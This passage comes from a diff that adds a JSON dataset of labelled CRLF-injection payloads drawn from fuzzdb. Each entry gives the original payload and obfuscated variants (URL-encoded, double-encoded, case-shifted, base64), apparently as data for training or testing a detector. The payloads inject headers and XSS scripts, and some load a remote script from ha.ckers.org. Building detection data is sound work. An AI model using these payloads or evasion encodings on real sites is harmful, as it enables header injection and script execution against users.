+    "obfuscated_payload": "%250AContent-Type%3Ahtml%250A%250A%253Cscript%253Ealert%28%2522XSS%2522%29%253C%2Fscript%253E",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93163907,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00025__obf02",
+    "payload": "JTBBQ29udGVudC1UeXBlOmh0bWwlMEElMEElM0NzY3JpcHQlM0VhbGVydCglMjJYU1MlMjIpJTNDL3NjcmlwdCUzRQ==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00025",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "e5d4f4fc09f7ad8443db00470b2b5b52e07907665aaf66796d6595be8de2adb3",
+    "original_id": "raw_logi_00025",
+    "original_payload": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "JTBBQ29udGVudC1UeXBlOmh0bWwlMEElMEElM0NzY3JpcHQlM0VhbGVydCglMjJYU1MlMjIpJTNDL3NjcmlwdCUzRQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 93164916,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00025__obf03",
+    "payload": "%0aContent-Type:html%0a%0a%3Cscript%3Ealert(%22XSS%22)%3C/script%3e",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00025",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "e5d4f4fc09f7ad8443db00470b2b5b52e07907665aaf66796d6595be8de2adb3",
+    "original_id": "raw_logi_00025",
+    "original_payload": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "%0aContent-Type:html%0a%0a%3Cscript%3Ealert(%22XSS%22)%3C/script%3e",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93165925,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00025__obf04",
+    "payload": "%250aContent-Type:html%0a%250a%3Cscript%253Ealert%28%22XSS%2522%29%253c%2Fscript%253e",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00025",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "e5d4f4fc09f7ad8443db00470b2b5b52e07907665aaf66796d6595be8de2adb3",
+    "original_id": "raw_logi_00025",
+    "original_payload": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "%250aContent-Type:html%0a%250a%3Cscript%253Ealert%28%22XSS%2522%29%253c%2Fscript%253e",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93166934,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00026__obf01",
+    "payload": "%0%41%%30A%3%43script%3Ealert(%22XSS%%322)%3C/script%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00026",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "aac5669c02f04c428855682c09a59531bb78dd3ac4d2cc6a15e902fdd6d8a383",
+    "original_id": "raw_logi_00026",
+    "original_payload": "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "%0%41%%30A%3%43script%3Ealert(%22XSS%%322)%3C/script%3E",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93263910,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00026__obf02",
+    "payload": "JTBBJTBBJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM0U=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00026",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "aac5669c02f04c428855682c09a59531bb78dd3ac4d2cc6a15e902fdd6d8a383",
+    "original_id": "raw_logi_00026",
+    "original_payload": "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "JTBBJTBBJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM0U=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 93264919,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00026__obf03",
+    "payload": "%0a%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00026",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "aac5669c02f04c428855682c09a59531bb78dd3ac4d2cc6a15e902fdd6d8a383",
+    "original_id": "raw_logi_00026",
+    "original_payload": "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "%0a%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93265928,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00026__obf04",
+    "payload": "JTBhJTBBJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM0U",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00026",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "aac5669c02f04c428855682c09a59531bb78dd3ac4d2cc6a15e902fdd6d8a383",
+    "original_id": "raw_logi_00026",
+    "original_payload": "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+    "obfuscated_payload": "JTBhJTBBJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM0U",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode",
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 93266937,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00027__obf01",
+    "payload": "%250AContent-Type%3Ahtml%250A%250A%253Cscript%253Ealert%28%2522XSS%22)%253C%2Fscript%253Ehttp%3A%2F%2Fwww.test.com",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00027",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "485cc78a9341cbd7dc5499e41a7921758b3743dcb10bfde2afe716b2e0ff1897",
+    "original_id": "raw_logi_00027",
+    "original_payload": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com",
+    "obfuscated_payload": "%250AContent-Type%3Ahtml%250A%250A%253Cscript%253Ealert%28%2522XSS%22)%253C%2Fscript%253Ehttp%3A%2F%2Fwww.test.com",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93363913,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00027__obf02",
+    "payload": "JTBBQ29udGVudC1UeXBlOmh0bWwlMEElMEElM0NzY3JpcHQlM0VhbGVydCglMjJYU1MlMjIpJTNDL3NjcmlwdCUzRWh0dHA6Ly93d3cudGVzdC5jb20=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00027",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "485cc78a9341cbd7dc5499e41a7921758b3743dcb10bfde2afe716b2e0ff1897",
+    "original_id": "raw_logi_00027",
+    "original_payload": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com",
+    "obfuscated_payload": "JTBBQ29udGVudC1UeXBlOmh0bWwlMEElMEElM0NzY3JpcHQlM0VhbGVydCglMjJYU1MlMjIpJTNDL3NjcmlwdCUzRWh0dHA6Ly93d3cudGVzdC5jb20=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 93364922,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00027__obf03",
+    "payload": "%0aContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00027",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "485cc78a9341cbd7dc5499e41a7921758b3743dcb10bfde2afe716b2e0ff1897",
+    "original_id": "raw_logi_00027",
+    "original_payload": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com",
+    "obfuscated_payload": "%0aContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93365931,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00027__obf04",
+    "payload": "JTBBQ29udGVudC1UeXBlOmh0bWwlMEElMEElM0NzY3JpcHQlM0VhbGVydCglMjJYU1MlMjIpJTNDL3NjcmlwdCUzRWh0dHA6Ly93d3cudGVzdC5jb20",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00027",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "485cc78a9341cbd7dc5499e41a7921758b3743dcb10bfde2afe716b2e0ff1897",
+    "original_id": "raw_logi_00027",
+    "original_payload": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com",
+    "obfuscated_payload": "JTBBQ29udGVudC1UeXBlOmh0bWwlMEElMEElM0NzY3JpcHQlM0VhbGVydCglMjJYU1MlMjIpJTNDL3NjcmlwdCUzRWh0dHA6Ly93d3cudGVzdC5jb20",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 93366940,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00028__obf01",
+    "payload": "%25250d%25250a%25250d%25250a%25253Chtml%25253E%25253Cbody%25253E%25253C%25252Fbody%25253E%25253Cscript%252Bsrc%25253Dhttp%25253A%25252F%25252Fha.ckers.org%25252Fs.js%25253E%25253C%25252Fscript%25253E%25253Cscript%25253Ealert%2528%252522location.host%252520is%253A%252520%252522%25252Blocation.host%2529%25253C%25252Fscript%25253E%25253C%25252Fhtml%25253E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00028",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "af6728be149728278c82c56b278e5aeb1d89e5c09e40fdc5ea3850cb4ef1f616",
+    "original_id": "raw_logi_00028",
+    "original_payload": "%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E",
+    "obfuscated_payload": "%25250d%25250a%25250d%25250a%25253Chtml%25253E%25253Cbody%25253E%25253C%25252Fbody%25253E%25253Cscript%252Bsrc%25253Dhttp%25253A%25252F%25252Fha.ckers.org%25252Fs.js%25253E%25253C%25252Fscript%25253E%25253Cscript%25253Ealert%2528%252522location.host%252520is%253A%252520%252522%25252Blocation.host%2529%25253C%25252Fscript%25253E%25253C%25252Fhtml%25253E",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 93463916,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00028__obf02",
+    "payload": "JTBkJTBhJTBkJTBhJTNDaHRtbCUzRSUzQ2JvZHklM0UlM0MlMkZib2R5JTNFJTNDc2NyaXB0K3NyYyUzRGh0dHAlM0ElMkYlMkZoYS5ja2Vycy5vcmclMkZzLmpzJTNFJTNDJTJGc2NyaXB0JTNFJTNDc2NyaXB0JTNFYWxlcnQoJTIybG9jYXRpb24uaG9zdCUyMGlzOiUyMCUyMiUyQmxvY2F0aW9uLmhvc3QpJTNDJTJGc2NyaXB0JTNFJTNDJTJGaHRtbCUzRQ==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00028",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "af6728be149728278c82c56b278e5aeb1d89e5c09e40fdc5ea3850cb4ef1f616",
+    "original_id": "raw_logi_00028",
+    "original_payload": "%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E",
+    "obfuscated_payload": "JTBkJTBhJTBkJTBhJTNDaHRtbCUzRSUzQ2JvZHklM0UlM0MlMkZib2R5JTNFJTNDc2NyaXB0K3NyYyUzRGh0dHAlM0ElMkYlMkZoYS5ja2Vycy5vcmclMkZzLmpzJTNFJTNDJTJGc2NyaXB0JTNFJTNDc2NyaXB0JTNFYWxlcnQoJTIybG9jYXRpb24uaG9zdCUyMGlzOiUyMCUyMiUyQmxvY2F0aW9uLmhvc3QpJTNDJTJGc2NyaXB0JTNFJTNDJTJGaHRtbCUzRQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 93464925,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00028__obf03",
+    "payload": "%0D%0a%0D%0A%3Chtml%3e%3cbody%3e%3c%2fbody%3e%3Cscript+src%3Dhttp%3A%2f%2Fha.ckers.org%2Fs.js%3e%3C%2Fscript%3E%3Cscript%3ealert(%22location.host%20is:%20%22%2blocation.host)%3C%2fscript%3e%3c%2Fhtml%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00028",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "af6728be149728278c82c56b278e5aeb1d89e5c09e40fdc5ea3850cb4ef1f616",
+    "original_id": "raw_logi_00028",
+    "original_payload": "%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E",
+    "obfuscated_payload": "%0D%0a%0D%0A%3Chtml%3e%3cbody%3e%3c%2fbody%3e%3Cscript+src%3Dhttp%3A%2f%2Fha.ckers.org%2Fs.js%3e%3C%2Fscript%3E%3Cscript%3ealert(%22location.host%20is:%20%22%2blocation.host)%3C%2fscript%3e%3c%2Fhtml%3E",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93465934,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00028__obf04",
+    "payload": "JTBkJTBhJTBEJTBBJTNDaHRtbCUzRSUzQ2JvZHklM0UlM2MlMkZib2R5JTNlJTNDc2NyaXB0K3NyYyUzRGh0dHAlM0ElMkYlMkZoYS5ja2Vycy5vcmclMmZzLmpzJTNlJTNDJTJGc2NyaXB0JTNlJTNDc2NyaXB0JTNlYWxlcnQoJTIybG9jYXRpb24uaG9zdCUyMGlzOiUyMCUyMiUyQmxvY2F0aW9uLmhvc3QpJTNDJTJGc2NyaXB0JTNFJTNjJTJmaHRtbCUzZQ",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00028",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "af6728be149728278c82c56b278e5aeb1d89e5c09e40fdc5ea3850cb4ef1f616",
+    "original_id": "raw_logi_00028",
+    "original_payload": "%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E",
+    "obfuscated_payload": "JTBkJTBhJTBEJTBBJTNDaHRtbCUzRSUzQ2JvZHklM0UlM2MlMkZib2R5JTNlJTNDc2NyaXB0K3NyYyUzRGh0dHAlM0ElMkYlMkZoYS5ja2Vycy5vcmclMmZzLmpzJTNlJTNDJTJGc2NyaXB0JTNlJTNDc2NyaXB0JTNlYWxlcnQoJTIybG9jYXRpb24uaG9zdCUyMGlzOiUyMCUyMiUyQmxvY2F0aW9uLmhvc3QpJTNDJTJGc2NyaXB0JTNFJTNjJTJmaHRtbCUzZQ",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 93466943,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00029__obf01",
+    "payload": "%0d%0a%0%64%0%61%%33Cscript+sr%63%3%44http%3%41%2F%2Fha%2Eckers.org%%32Fxs%73.%6As%3%45%3C%2%46script%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00029",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "eb8165b99fc5c421767557e9f62feb95e8593bd7c881e3c689972ad37738d2ae",
+    "original_id": "raw_logi_00029",
+    "original_payload": "%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E",
+    "obfuscated_payload": "%0d%0a%0%64%0%61%%33Cscript+sr%63%3%44http%3%41%2F%2Fha%2Eckers.org%%32Fxs%73.%6As%3%45%3C%2%46script%3E",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93563919,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00029__obf02",
+    "payload": "JTBkJTBhJTBkJTBhJTNDc2NyaXB0K3NyYyUzRGh0dHAlM0ElMkYlMkZoYS5ja2Vycy5vcmclMkZ4c3MuanMlM0UlM0MlMkZzY3JpcHQlM0U=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00029",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "eb8165b99fc5c421767557e9f62feb95e8593bd7c881e3c689972ad37738d2ae",
+    "original_id": "raw_logi_00029",
+    "original_payload": "%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E",
+    "obfuscated_payload": "JTBkJTBhJTBkJTBhJTNDc2NyaXB0K3NyYyUzRGh0dHAlM0ElMkYlMkZoYS5ja2Vycy5vcmclMkZ4c3MuanMlM0UlM0MlMkZzY3JpcHQlM0U=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 93564928,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00029__obf03",
+    "payload": "\\r\\n%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00029",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "eb8165b99fc5c421767557e9f62feb95e8593bd7c881e3c689972ad37738d2ae",
+    "original_id": "raw_logi_00029",
+    "original_payload": "%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E",
+    "obfuscated_payload": "\\r\\n%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93565937,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00029__obf04",
+    "payload": "%5Cr%5Cn%250d%250a%253Cscript%2Bsrc%253Dhttp%253A%252F%252Fha.ckers.org%252Fxss.js%253E%253C%252Fscript%253E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00029",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "eb8165b99fc5c421767557e9f62feb95e8593bd7c881e3c689972ad37738d2ae",
+    "original_id": "raw_logi_00029",
+    "original_payload": "%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E",
+    "obfuscated_payload": "%5Cr%5Cn%250d%250a%253Cscript%2Bsrc%253Dhttp%253A%252F%252Fha.ckers.org%252Fxss.js%253E%253C%252Fscript%253E",
+    "obfuscation_chain": [
+      "log_json_newline",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93566946,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00030__obf01",
+    "payload": "%22%3E%%30A%%30%41%3Cscript%3%45alert(%2%32XSS%22)%3C/script%3%45%3%43%22",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00030",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "ced058455ca9f049d30349cfe7704e9e13a4f59514f8c5a65fbdedfaadcebd63",
+    "original_id": "raw_logi_00030",
+    "original_payload": "%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22",
+    "obfuscated_payload": "%22%3E%%30A%%30%41%3Cscript%3%45alert(%2%32XSS%22)%3C/script%3%45%3%43%22",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93663922,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00030__obf02",
+    "payload": "JTIyJTNFJTBBJTBBJTNDc2NyaXB0JTNFYWxlcnQoJTIyWFNTJTIyKSUzQy9zY3JpcHQlM0UlM0MlMjI=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00030",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
